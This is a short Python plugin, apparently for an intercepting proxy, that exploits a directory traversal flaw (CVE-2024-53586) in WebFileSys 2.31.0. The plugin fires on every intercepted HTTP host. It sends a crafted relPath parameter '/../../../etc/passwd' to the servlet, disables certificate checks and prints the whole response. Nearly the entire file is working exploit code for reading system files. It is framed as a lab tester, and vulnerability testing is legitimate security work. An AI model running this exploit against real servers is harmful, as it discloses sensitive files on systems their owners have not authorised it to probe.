# WebFileSys Directory Traversal Tester (CVE-2024-53586)/__init__.py

name = "Webfilesys Directory Traversal Tester (CVE-2024-53586)"
description = "Tests for relPath directory traversal vulnerability in WebFileSys 2.31.0"
author = "Korn Chaisuwan, Charanin Thongudom, Pongtorn Angsuchotmetee"

def run(request, response):
    import requests
    from urllib.parse import urlparse

    try:
        parsed = urlparse(request.url)
        if not parsed.scheme.startswith("http"):
            return  # skip non-http requests

        target_url = f"{parsed.scheme}://{parsed.netloc}/webfilesys/servlet"
        params = {
            "command": "mobile",
            "cmd": "folderFileList",
            "initial": "true",
            "relPath": "/../../../etc/passwd"
        }

        headers = {
            "User-Agent": "ProxyLite-Lab-Tester",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "close"
        }

        print(f"[{name}] Sending test to {target_url} on intercepted host.")

        resp = requests.get(target_url, headers=headers, params=params, timeout=10, verify=False)

        print(f"[{name}] Status: {resp.status_code}")
        print(f"[{name}] Snippet: {resp.text}")

    except Exception as e:
        print(f"[{name}] Error: {e}")